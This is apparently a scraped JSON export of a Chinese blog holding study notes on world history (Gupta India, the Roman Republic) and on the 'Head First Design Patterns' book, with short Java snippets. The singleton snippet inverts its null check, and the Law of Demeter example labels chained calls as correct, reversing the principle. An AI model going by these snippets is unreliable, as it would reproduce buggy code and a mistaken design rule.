亚历山大大帝与希腊人，其次是帕提亚人，西徐亚人，之后是贵霜人。 商人 ​ 侵略者促进了延印度北部由西(至中东、欧洲)、向北(至中亚、东亚)的贸易路线发展。 文化 ​ 印度佛教传教者将教义传播到了周围所有的国家。公元1世纪，基督教由海路传入印度，但布教遭到了强烈反对。 笈多古典时代建立 ​ 笈多帝国同样以摩揭陀王国为根据地，笈多帝国在孔雀帝国崩溃后维持了独立，在贵霜帝国崩溃后迅速填补了其地区权力真空。笈多时代始于旃陀罗笈多一世登基(约320年)，并迅速在其孙子旃陀罗笈多二世(375-415)统治下达到巅峰。笈多帝国是一个北印度帝国，与南部隔绝。 繁荣 ​ 笈多帝国进行了金、银币统一的货币改革，且贸易量在旃陀罗笈多二世时期达到了巅峰，由国家保护对内及对外贸易的安全。 政策 ​ 笈多帝国采用温和政策：刑法几乎不砍头；也没有像孔雀帝国那样的警察间谍机构骚扰民众；民众也拥有一定的宗教自由。 文化、科技 ​ 笈多帝国将梵语世俗化(从婆罗门专属语言到大众语言)；发明了阿拉伯数字(可以和同时期的罗马数字对比看看，这是十进制表示法的首次应用)。","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"10.状态模式-设计模式","date":"2020-12-22T03:53:00.000Z","path":"2020/12/22/coding/designPatten/10.状态模式-设计模式/","text":"状态模式 “策略模式与状态模式是双胞胎，在出生时才分开。” 定义: “状态模式允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它的类。” 状态: 可以理解为对象的一个字段/变量。 在内部状态改变时改变它的行为: 对象的同一个方法会因为状态的改变而产生不同的结果，看起来类方法内部实现的算法完全换了一个。 对外开放扩展，关闭改变的原则 我们将不同状态产生的行为 (对于不同的状态，类的方法中应该有不同的实现，我们称这些不同的实现算法为不同状态产生的行为) 迁移到实现状态接口的不同状态类中，利用类中状态变量的setter函数来改变对象的状态(我们称状态与类之间这样的关系为组合)，状态改变即意味着有外来方法调用状态变量的setter将状态变量所属的类完全变成了另外一个状态类(都实现了状态接口的不同状态类)。 不同状态的行为名我们需全部聚合起来放到状态接口中，每一个状态类都要实现这些接口方法。即是这个状态配上那个行为可能不会产生什么，也需要实现以便于统一调用。 我们在类的对应方法中直接调用状态变量对应的行为方法(这些行为方法全部被装载在了状态接口中)，如果状态变量的类被setter改变了，则状态变量调用的同名方法其中的具体实现也会不一样(状态类变了，状态接口的实现方法也变了)。 所以，我们只是通过组合的简单引用来改变对象的内部方法的实现过程而已，并没有改变对象内部。 并且，还有重要的一点是，客户不会直接和状态交互。 状态转换放在哪里？ 放在使用状态的类中，这样会导致状态类与使用状态的类耦合度很高，但是代码简单易懂。 放在状态类中，这样不仅耦合度低，还可以实现动态转换。 状态模式与策略模式 策略模式是通过组合更换对象的行为。 状态模式是通过组合更换对象的状态[从而更换对象的行为]。 =&gt; 类图相同，意图不同。 代码: https://github.com/v25bh145/patternDesign-code/tree/master/Candle","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"9.迭代器模式与组合模式-设计模式","date":"2020-12-20T04:18:00.000Z","path":"2020/12/20/coding/designPatten/9.迭代器与组合模式-设计模式/","text":"迭代器与组合模式 “有许多种方法可以把对象堆起来成为一个集合” =&gt; 如何做到封装不同集合的遍历呢？ 迭代器模式 “封装不同集合的遍历” 将不同集合的遍历过程封装起来，使用相同的集合访问接口。 使用迭代器接口实现 定义: “迭代器模式提供了一种方法顺序访问一个聚合对象中的各种元素，而又不暴露其内部的表示。” 顺序: 指以聚合对象内部的顺序，可以不是输入的原顺序。 聚合对象: 也可以称为集合对象(collections)，只要是相同数据类型的变量的集合即可。 内部表示: 并不会告知内部是什么数据结构实现的，我们也在调用时看不到内部具体的实现算法，也就是说将调用与内部实现解耦了 设计原则 - 一个类应该只有一个引起变化的原因 一个引起变化的原因:若有两个引起变化的原因，则会在改变需求的时候不容易修改代码。 =&gt; 要正确区分设计中的责任 “内聚(cohesion)“: 用来度量一个类/模块紧密地达到单一目的的责任。 当一个模块或一个类被设计成只支持一组相关的功能时，我们说它具有高内聚。 组合模式 定义: “组合模式允许你讲对象组合成树形结构来表现[整体/部分]的层次结构。组合能让客户以一致的方式处理个别对象以及对象组合。” 树形结构: 组件、组合、叶节点 组件是一个接口，组合与叶节点将实现接口中的方法，一般有三个默认行为: add()、remove()、getChild()。 组合是一个非叶节点，其可以有孩子，孩子可以是叶节点或其他的组合。 叶节点不能有子，通过实现组件的操作，定义组合内元素的行为。 “以单一责任设计原则换取透明性“ 单一设计原则: 抽象类不止负责一个功能，同时拥有了叶节点(执行方法)与组合(管理层次)的功能。 透明性: 通过使叶节点与组合继承一个抽象类，客户会将叶节点与组合一视同仁。 示例代码: 迭代器模式: https://github.com/v25bh145/patternDesign-code/tree/master/RestaurantMerge/src/Iteratorpattern 组合模式: https://github.com/v25bh145/patternDesign-code/tree/master/RestaurantMerge/src/Compositepattern [组合模式中外部迭代器的实现有个输出bug，如果您调试出来具体问题了劳烦告知我，万分感谢]","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"8.模板方法模式-设计模式","date":"2020-12-17T03:18:00.000Z","path":"2020/12/17/coding/designPatten/8.模板算法模式-设计模式/","text":"模板方法 “封装算法” 定义1: “模板方法定义了一个算法的步骤，并允许子类为一个或多个步骤提供实现。” 定义2: “模板方法模式在一个方法中定义一个算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以在不改变算法结构的情况下，重新定义算法中的某些步骤” 算法的步骤 &amp; 算法的骨架: 我们将多个子类各要实现的算法泛化为一个总体框架(也可以说是，骨架。这个总体框架即称为模板方法)与逻辑部分的接口(逻辑部分也可以说是模板方法定义出来的一连串步骤的具体实现，这里抽象出来了逻辑部分的接口)，放在基类(这个基类一般为抽象类)中。 =&gt; 模板方法是final类型，也就是说是子类不可覆盖的。 存在不需要子类也可以实现的逻辑方法时，我们可以在抽象类中直接实现之，称为”钩子(hook)“，子类可以选择性覆盖钩子。 钩子: 可以作为条件控制影响算法流程 子类提供实现: 子类可以继承基类，覆盖基类的逻辑部分代码，提供不同的实现。 好莱坞原则: “别调用(call 打电话)给我们，我们会调用(call 打电话)你” “依赖腐败”: 高层组件依赖低层组件，低层组件依赖高层组件，高层组件依赖边侧组件，边侧组件依赖低层组件(即环状依赖)。 好莱坞原则允许低层组件将自己挂钩到高层组件上，但是调用与否以及何时调用是由高级组件决定的。 低层组件绝不能调用高层组件。 工厂模式是模板方法模式的一种特殊版本 模板方法模式将算法框架抽象出来，每一个步骤具体的实现过程交由子类实现(也可以自己实现/使用钩子)。 工厂方法模式将创建过程抽象出来，创建的具体过程交由子类实现(也可以自己实现/使用钩子)。 模板方法示例代码详见https://github.com/v25bh145/patternDesign-code/tree/master/CoffeeAndTea JAVA中的模板方法: Arrays.sort()与Comparable接口(compareTo()方法): https://github.com/v25bh145/patternDesign-code/tree/master/DuckSort","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"7.适配器模式&外观模式-设计模式","date":"2020-12-15T03:40:00.000Z","path":"2020/12/15/coding/designPatten/7.适配器模式&外观模式-设计模式/","text":"适配器模式&amp;外观模式 交流电适配器 =&gt; “将一个接口转换成另一个接口，以符合客户的期望” “如果它走起路来像只鸭子，叫起来像只鸭子，那么它必定可能是一只鸭子包装了鸭子适配器的火鸡” 客户使用适配器的过程 客户通过目标接口调用适配器的方法对适配器发出请求。 适配器使用被适配者接口把请求转换成被适配者的一个或多个接口。 客户接收到调用的结果，但并未察觉这一切是适配器在起转换作用。 适配器要把被适配者转换成客户需要的样子。 客户与被适配者是解耦的。 定义: “适配器模式将一个类的接口，转换成客户期望的另一个接口，适配器让原本接口不兼容的类可以合作无间。” 由类通过实现目标接口来包装被适配者。 被适配者的子类也可以搭配适配器使用。 适配不完全的例子-枚举器&amp;迭代器的适配器 =&gt; 抛出异常 123456789101112131415161718public class EnumerationIterator implements Iterator &#123; Enumeration enum; public EnumerationIterator(Enumeration enum) &#123; this.enum = enum; &#125; public boolean hasNext() &#123; return enum.hasMoreElements(); &#125; public Object next() &#123; return enum.nextElement(); &#125; public void remove() &#123; //枚举类中没有迭代器中remove()相对应的接口，因此只能抛出异常 throw new UnsupportedOperationException(); &#125;&#125; https://github.com/v25bh145/patternDesign-code/tree/master/Turkey 查看实例代码 定义: “外观模式提供了一个统一的接口，用来访问子系统中的一群接口。外观模式定义了一个高级接口，让子系统更容易使用。” 外观模式并没有封装子系统，而是提供了一个简化版的接口。 (命令模式则封装、统一了接口，提供了一个统一的、向外开放的命令接口) 外观模式将客户从组件的子系统中解耦。 外观模式的意图是简化接口，而适配器的意图是转换、改变接口。 实现一个外观，需要将子系统组合(变量形式)进外观中，然后将工作委托(调用变量的方法或数据)给子系统执行。 “最少知识原则(墨忒尔法则)” =&gt; “只和你的密友谈话” 减少对象之间的交互，不要让太多类耦合在一起。 方针: =&gt; 在任何对象的方法内，我们只应该调用属于以下范围的方法: 该对象本身 被当作方法的参数传递而来的对象 此方法所创建或实例化的任何对象 对象的任何组件 =&gt; 组件想象成实例对象所引用的对象，即是”HAS-A”关系 缺点: 会有很多包装类被制造出来，导致复杂度、开发时间增加与运行性能降低。 错误用法举例: 123456789public float getTemp() &#123; //不要声明[传递/创建/实例化]的对象所[传递/创建/实例化]的对象 //也就是说，避免二次引用，提倡一次饮用 Thermometer thermometer = station.getThermometer(); return getTempHelper(thermometer);&#125;public float getTempHelper(Thermometer thermometer) &#123; return thermometer.getTemperature();&#125; 正确用法 1234public float getTemp() &#123; //在之间使用station解耦 return tation.getThermometer().getTemperature();&#125; https://github.com/v25bh145/patternDesign-code/tree/master/HomeTheater 查看实例代码","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"6.命令模式-设计模式","date":"2020-12-13T08:35:00.000Z","path":"2020/12/13/coding/designPatten/6.命令模式-设计模式/","text":"命令模式 “把方法调用封装起来” 定义: “命令模式把请求封装成对象，以便使用不同的请求、队列或者日志来参数化其他的对象。命令模式也支持可撤销的操作。” 在接收者上绑定一组动作到命令对象上来封装一个请求。 =&gt; 命令对象只暴露execute()方法，在方法内部封装接收者与接收者动作的具体实现。 使用命令来参数化对象。 =&gt; 传递者使用抽象命令接口，且传入(已绑定好执行者的)具体的命令对象。 我们也可以直接在命令对象层实现一些逻辑，尽管不符合命令模式的框架。 我们也可以将许多命令聚合为一个宏命令，只要满足抽象命令接口即可。 https://github.com/v25bh145/patternDesign-code/tree/master/RemoteControl 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"5.单件模式-设计模式","date":"2020-12-13T03:04:00.000Z","path":"2020/12/13/coding/designPatten/5.单件模式-设计模式/","text":"单件模式 “用来创建独一无二的，只能有一个实例的对象的入场券。” 定义: “单件模式确保一个类只有一个实例，并提供一个全局访问点。” 全局访问点: 构造函数是私有方法，而提供一个公开、静态的getInstance()方法 1234public static Singleton getInstance() &#123; if(uniqueInstance != null) uniqueInstance = new Singleton(); return uniqueInstance;&#125; 注意:如果使用1.2版本或之前的JVM，需要建立单件注册表，以免垃圾收集器回收单件。 线程安全性 将getInstance()改为同步方法(synchronized)，但是性能将遭受损失。 对uniqueInstance赋初值，不再改变它 (也就是说，getInstance不负责创建对象，仅仅负责返回对象。 双重检查加锁 12345678910111213141516//volatile: 当变量被初始化时，确保多个进程能正确处理变量private volatile static Singleton uniqueInstance;public static Singleton getInstance() &#123; //如果单例已经创建过了，则不会进入这个if区块，也就是说没有由锁带来的性能损失 if(uniqueInstance == null) &#123; //进入此区域的仅限于想要初始化单例的进程。也就是说，到达这里的为第一批的单例创建者们 synchronized (Singleton.class) &#123; //而其中只能有一个单例创建者进入创建单例 if(uniqueInstance == null) uniqueInstance = new Singleton(); &#125; &#125; return uniqueInstance&#125; 不适用于1.4或更早版本的java。","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"4.工厂模式-设计模式","date":"2020-12-12T19:08:00.000Z","path":"2020/12/13/coding/designPatten/4.工厂模式-设计模式/","text":"工厂模式 除了new之外，还有更多制造对象的方法。 简单工厂、工厂方法 “封装创建对象“ 将创建对象的代码封装到一个对象中，我们称这个对象为”工厂“。 如果将创建对象的代码封装到一个静态方法中，我们可以称此位”静态工厂“，有一个缺点:不能通过继承来改变创建方法的行为。 “由一个对象负责所有具体类的实例化” =&gt; “由一群子类负责实例化” “工厂方法用来处理对象的创建，并将这样的行为封装在子类中。这样，客户程序中关于超类的代码就和子类对象创建代码解耦了。” abstract Product factoryMethod(String type) 在工厂抽象父类向外的创建接口中调用这个抽象方法，将这个抽象方法[委托]给了子类的具体实现，实现了解耦。 “平行的类层级” 创建者基类与产品基类属同一层级，每个子类都有自己特定的实现。 创建者基类的子类时不同的创建者，产品基类的子类是产品类型，其中的关系可以是一对一，也可以是一对多。 定义: “工厂方法模式定义了一个创建对象的接口，但由子类决定要实例化的类时哪一个。工厂方法让类把实例化推迟到子类。” 接口: factoryMethid(String type) : Product 推迟:由子类实现，也可以认为是委托。 决定:抽象创建者基类并不知道要实例化哪一种产品，当选择创建者子类时，就明确了可以实例化什么样的产品(也就是说，new Product()在子类中发生，type在子类中发挥效果。 简单工厂并不是一种设计模式。 简单工厂只有一个创建者实现类，没有创建者基类。 简单工厂将所有种类的创建全部放在了一个地方，而工厂方法则创建了一个框架。 “要依赖抽象，不要依赖具体类” —— 依赖倒置原则 依赖: 当new一个具体类，就依赖于一个具体类。 不能让高层组件依赖低层组件，且不管高层组件还是低层组件，两者都应依赖于抽象。 高层组件: 由其他低层组件定义其行为的类。 放到工厂方法中，高层组件即是创建者类，低层组件即是产品子类，两者都依赖于抽象产品类。 应该重写代码以便于我们依赖抽象类而不依赖具体类。 倒置:低层组件在依赖高层组件的抽象，我们思考问题从低层到抽象基类，再到抽象基类的创建。 遵守依赖倒置原则的指导方针: 变量不可以持有具体类的引用。 new，可以通过使用工厂来避开引用。 不要让类派生自具体类。 让类派生自一个抽象。 不要覆盖基类中已经实现的方法。 如果覆盖了基类已经实现的方法，则说明现在的基类不适合继承。 当然，如果这个类不会改变或是在简单程序中，完全可以不使用依赖倒置原则。 抽象工厂pre ​ 还可将创建子类共同的字段提取出来，将共同字段的区别另归于一个抽象工厂(另外一系列创建者)，而原本的使用该字段区别开的产品子类可以去掉，也就是说，由于该字段的区别造成的分类可以不用再创建产品子类。 ​ 放到例子中来说就是，当纽约和芝加哥的工厂的原料字段相同，但原料字段内容不同时，可以另提取出一个抽象的原料工厂(另一系列抽象创建者)和两个具体的芝加哥与纽约原料工厂(另一系列具体创建者);而原本的纽约奶酪披萨和芝加哥奶酪披萨(两个因字段内容不同分开的产品子类)就可以合并为一个奶酪披萨(合并字段意义的产品子类)了;不变地，我们若想要生产纽约的奶酪披萨，同样只需使用纽约奶酪披萨制造工厂(创建者子类)即可。 ​ 为了实现上述功能，两个奶酪披萨制造工厂的代码需要改变一下，原先是创建不同地区的奶酪披萨(两个因字段内容不同分开的产品子类)，现在直接使用奶酪披萨和不同地区的原料工厂(不同地区的原料工厂使用变量来引入)，在生产奶酪披萨时(new)，直接将原料工厂变量传入奶酪披萨(合并字段意义的产品子类)的构造函数即可。 定义: “抽象工厂模式提供一个接口，用于创建相关或依赖对象的家族，而不需要明确指定类。” 抽象工厂方法允许客户使用抽象的接口创建一组相关的产品，而不需要知道实际产生的产品是什么。 客户从具体的产品中解耦。 家族: 举个例子，原料就是产品家族，而构成原料的奶酪、蔬菜、水果等则是产品家族的组成部分，记为抽象产品类(也可以称为产品抽象接口)，我们可以任意扩展该抽象类。(举个例子，青菜与菠菜都是扩展自蔬菜类型)。换言之，家族与抽象产品类为HAS-A关系，抽象产品类与具体产品类为IS-A关系。 接口: 即是创建不同抽象产品类的接口们。一个抽象工厂的家族由多少个抽象产品类组成，就可以有多少个接口。 不需要明确指定: 继承自抽象工厂的具体工厂则可以实现抽象工厂的接口，任意指定产品的具体类。换言之，抽象工厂不知道具体产品类是什么，只知道抽象产品类是什么。 “工厂方法潜伏在抽象工厂里” 可以在抽象工厂中利用工厂方法实现生产方法。 解耦 工厂方法: 创建子类继承基类的生产方法，子类决定方法返回的具体类型。 将客户从具体类型中解耦。 使用继承解耦。 抽象工厂: 创建具体工厂决定家族的抽象产品类使用什么具体产品类。 将客户从使用的具体产品中解耦。 使用对象的组合解耦。 工厂方法的优缺点 可以将一群产品集合为家族。 当扩展产品时需要改变接口。 具体工厂类中实现具体产品类时，常常会利用到工厂方法 例如我们的代码示例中就利用了工厂方法，每一个createXXX()方法都是工厂方法的标准接口 将具体产品类的生成委托给子类，这里子类为具体工厂类。 即抽象工厂是工厂方法的组合，其组合形式就是家族。 https://github.com/v25bh145/patternDesign-code/tree/master/Pizza 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"3.装饰者模式-设计模式","date":"2020-12-12T03:32:00.000Z","path":"2020/12/12/coding/designPatten/3.装饰者模式-设计模式/","text":"装饰者模式 给爱用继承的人一个全新的设计眼界(翻译: 再敢滥用继承我不打死你) 不修改底层代码而给你的对象赋予新的职责 “类应该对扩展开放，对修改关闭。” =&gt; 开放-关闭原则 类如果对扩展关闭，毫无疑问不具备可扩展性。 类如果对修改开放，则会导致一系列内部实现被扰乱。 没有必要使得每一个地方都保持开放-关闭原则，这样会增加代码的复杂度，通常只需在变化区实现此功能即可。 五点规则 装饰者和被装饰者对象有相同的超类型(父类)。 你可以用一个或多个装饰者包装被装饰者。 既然装饰者与被装饰者拥有相同的超类型，则可以使用装饰者去装饰一个已经包装过的装饰。 装饰者可以在所委托被装饰者的行为之前/之后，加上自己的行为，以达到特定的目的。 对象可以在任何时候被装饰，所以可以动态地、不限量地装饰被装饰者。 定义: “装饰者模式动态地将责任附加到对象上，若要扩展功能，装饰者提供了比继承更有弹性的替代方案。” 在代码中，具体被装饰者与装饰父类(抽象类或接口)继承了一个通用父类(可以是一个接口，但是JAVA内已经习惯了使用抽象类)，具体装饰者继承了装饰父类。 具体装饰者拥有一个通用父类的引用，指向包装的对象。 这里使用了大量的继承，但是关键的地方在于，我们利用继承达到”类型匹配“，而不是获得”行为“，且这里的继承完全可以替换成接口。 缺点:会在使用时加入大量小类，导致代码复杂性偏高。 =&gt; 需要避免过度使用 https://github.com/v25bh145/patternDesign-code/tree/master/Beverage 以及 https://github.com/v25bh145/patternDesign-code/tree/master/JavaIODecorator 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"2.观察者模式-设计模式","date":"2020-12-12T02:06:00.000Z","path":"2020/12/12/coding/designPatten/2.观察者模式-设计模式/","text":"观察者模式 让你的对象知悉现况 JDK使用最多的模式 “主题 + 订阅者 = 观察者模式” 主题负责产生/获取信息。(主题在所知的信息改变时会通知订阅者) 订阅者可以接收由主题发来的信息。 (订阅者会接收主题的通知并且做出改变) 订阅者可以随时取消订阅。 只要主题还在产生/获取消息，就会不断向订阅者发送消息。 e.g:报纸&amp;订阅报纸的人 定义: “观察者模式定义了对象之间的一对多依赖，这样一来，当一个对象改变状态时，它的所有依赖者都会收到通知并自动更新。” 一对多依赖，即指的是一个主题+多个订阅者的模式 大体框架 主题接口 &amp; 主题类 主题接口拥有注册、删除与通知订阅者三个接口。 主题类实现主题接口，另外还负责数据获取(称为状态)。 观察者接口 &amp; 观察者类 观察者接口拥有更新接口。 观察者类实现观察者接口，另外还有其他具体的数据处理方法。 “观察者模式提供了一种对象设计，让主题与观察者之间松耦合“ 松耦合: 指主题与观察者之间以接口(即是观察者接口)连接。 好处: 可以随时增加新的观察者，满足接口即可，且主题代码不需要修改。 可以独立复用主题/观察者，用于其他地方。 “为了交互对象之间的松耦合而努力” java.util.Observer &amp; java.util.Observable - 官方的观察者模式 在官方的Object类中，主题接口是一个抽象类Observable，主题类(可观察者)继承了Observable。 主题(可观察者)想要推送给观察者数据时，需要先执行setChanged()方法，之后执行notifyObservers()方法，其中notifyObservers可选直接传输一个数据对象。 当没有调用setChanged()方法直接调用notifyObservers()方法时，并不会给观察者传输数据。 还可以调用clearChanged()方法删除标记，hasChanged()查看标记。 观察者需要数据时，还可以向可观察者主动(pull)拉取数据 但是很遗憾，JAVA9弃用(@deprecation)了Observable与Observer…为什么？ https://github.com/v25bh145/patternDesign-code/tree/master/Observer 查看实例代码(加了注释、分类了文件) 补充: 使用了JAVA的PropertyChangeListener 类代替deprecated(已经废弃的)observer类 https://github.com/v25bh145/patternDesign-code/tree/master/UltimateDuck","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"1.策略模式-设计模式","date":"2020-12-11T17:53:00.000Z","path":"2020/12/12/coding/designPatten/1.策略模式-设计模式/","text":"设计模式-总 这几天顺手买了本《Head First 设计模式》，打算做个笔记，当然程序演示也会放在这里。 请各位配合书进行观看，这里有一些对书中抽象术语的总结与解释，并且有更完善的演示代码。 如果您发现我的笔记/演示程序有问题或是有什么建议，欢迎联系我 设计模式好处都有啥？ 程序员间模式级别的共享语言 策略模式 “当涉及维护时，为了复用目的而使用继承，结局并不完美。” 为什么”结局并不完美”呢? 当我们想要添加某一公共特性时: 我们会将其放在抽象类中，但有些子类并不需要这个特性，因此我们还需在这些不需要特性的子类中继承这个特性并置空，造成了不必要的麻烦。 我们选择另外写一个接口(特性接口)，但是这样却导致了大量需要这个特性的子类都需要写一遍这个接口的实现，出现大量的代码复用。 “找出应用中可能需要变化之处，把它们独立起来，不要和那些不需要变化的代码混在一起。” 即是说，我们要学会抽取子类中的不同点，不要试图将其复制粘贴到不同子类中从而导致混乱。 “针对接口编程，而不是针对实现编程。” 针对接口是什么意思？接口像是必须要完成的要求/约定，我们需要写出用于完成要求的行为类(行为类的定义在这里，即是行为接口的实现类)，由行为类来代替子类实现行为接口，最后再去将行为类绑定到每个子类上。 这样就不需要子类去写关于实现行为的代码了，只需将行为绑定到子类上即可，实现上已经由行为本身做好了。(能明显感觉到解耦吗？) “针对接口编程，真正的意思是针对超类型(supertype)编程。” 这里意思是，接口只是java的一个功能，我们使用的是多态功能，完全可以把接口理解为抽象类，由行为类继承抽象类。 可以更加明确地说成，超类型是指子类的变量类型完全可以是行为类。 我们可以将行为类实现的代码称为算法。 优点： 行为类被独立出了子类-抽象父类的继承关系。(“有了继承复用的好处，但是没有了继承所带来的包袱。”) 子类不需要实现重复的代码，将具体行为的实现与子类解耦开。 “有一个(HAS-A)比是一个(IS-A)更好” 即是使用变量表示”有”，相比于直接实现抽象类的抽象行为要解耦很多。 “多用组合，少用继承” 即是5.中的另外一种叙述方式。 策略模式正式的定义:”定义了算法族，分别封装起来，让它们之间可以相互替换，此模式让算法的变化独立于使用算法的客户“。 算法族:即由抽象行为接口 - 行为类构成。 相互替换: 在父类抽象类可以添加替换函数。 独立于使用算法的客户: 将子类与特征的具体行为实现解耦，使用HAS-A替代了IS-A。 https://github.com/v25bh145/patternDesign-code/tree/master/Duck 查看实例代码 (加了注释、分类了文件)","tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://v25bh145.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"《Head First 设计模式》","slug":"《Head-First-设计模式》","permalink":"https://v25bh145.github.io/tags/%E3%80%8AHead-First-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B/"}]},{"title":"6.罗马-全球通史","date":"2020-12-08T07:00:00.000Z","path":"2020/12/08/hobbies/history/全球通史/6.罗马-全球通史/","text":"希腊-罗马文明史(下)罗马历史上的早期共和国(至公元前264)​ 罗马人在击败西地中海最大的敌人迦太基之后转而东征，强迫马其顿与希腊臣服，最终强迫整个希腊化东方归顺。 reason(罗马人的起源)​ 印欧语系的拉丁人沿意大利半岛抵达台伯河南岸(印欧语系的亚该亚人与多里安人就进入了希腊)，罗马一开始只是一开始拉丁社团中的一个，但占有重要的地理位置，使得其更易于受到外来影响。 ​ 约公元前800年，伊特鲁斯坎人与希腊人先后移民到台伯河北面，给罗马人带去了比较先进的思想与技术。 development​ 约公元前500年，罗马驱走了最后一个伊特鲁斯坎国王，开启了独立城邦的历史。罗马制度的形成与希腊类似，由君主政体到贵族寡头，权力分为两部分: 执政官由选举产生，任期一年，由贵族单人 元老院作为立法机关，也是贵族团体(即是在接纳若干平民后性质仍未改变) 罗马征服并统一了整个意大利半岛: 意大利半岛只有一座小山脉，而不像希腊的山脉纵横交错。 罗马人对原住民实行宽容政策，大多数人拥有广泛而不充分的居民权，而雅典人对原住民征收贡物。 罗马人拥有强力的军事能力以及战术战略水平。 罗马的某些民主措施平民罢工: 一起撤出城市，直到他们的要求全部得到满足为止 保民官: 由平民在平民大会上选举，用于维护平民的利益。 其他制度: 指定法律并且公诸于世；限制任何人都能拥有的土地的最高额度。 罗马文明的后期共和国(公元前265-公元前27)布匿战争(公元前264-公元前146)迦太基的起源 ​ 迦太基最初建于公元前850年腓尼基人的殖民地，由于其几乎垄断了地中海西部的贸易，所以迦太基逐渐变得富裕强大，依靠舰队与雇佣军控制了非洲西北部、西班牙南部、萨丁、科西嘉与西西里岛西部。 罗马与迦太基的冲突 ​ 罗马人征服了意大利半岛，与西西里岛(迦太基的殖民地)非常近。 三次布匿战争的具体情况 结果(摘自上文百科) ​ 持续118年的布匿战争，以迦太基的灭亡而告结束。这次战争时间之长，规模之大、两国人民蒙受痛苦和灾难之深，都是历史上空前的。在今天，连迦太基这个名字都已不复存在，当今的突尼斯城是在古老的迦太基废墟上建起来的。 罗马的进一步征服reason 罗马成为了地中海的头号霸主 征服能够带来很明显的利益，从每个新的行省可以获得源源不断的战利品 process 罗马迅速吞并了马其顿、希腊以及小亚细亚的帕加马、比希尼亚与西里西亚 征服了塞琉古王朝的叙利亚 与公元前31年吞并埃及 在地中海东岸一带获得了若干行省(但是亚洲内地仍然属帕提亚所有) 尤里乌斯·凯撒与公元前58年-公元前49年征服了英吉利 海峡与地中海之间的整个高卢地区 公元1世纪起，罗马开始了对不列颠的长期占领 征服所带来的恶劣影响行省 罗马人对行省并不像对意大利半岛上的同盟国一样实行宽松政策，而是搞利益独裁，恶政比比皆是。 罗马本国 ​ 糟糕的行省总督制度影响到了罗马本国的发展，成群的奴隶、成堆的谷物经由总督运往罗马城。罗马城外的农民收入卑微，且有大批奴隶会替代农民的工作，导致这些农民纷纷搬家到罗马城内，住在肮脏的房子中。农民们把土地出售给暴发户阶级，到公元前2世纪，意大利的土地已经属于新兴地主所有，由奴隶作为劳动力的庄园不断增加。 贵族与民主化 ​ 在政治方面，由于元老院在海外指挥频频胜利，贵族的威望与权力不断增加，导致罗马早期的民主化趋向逆转。 军事 ​ 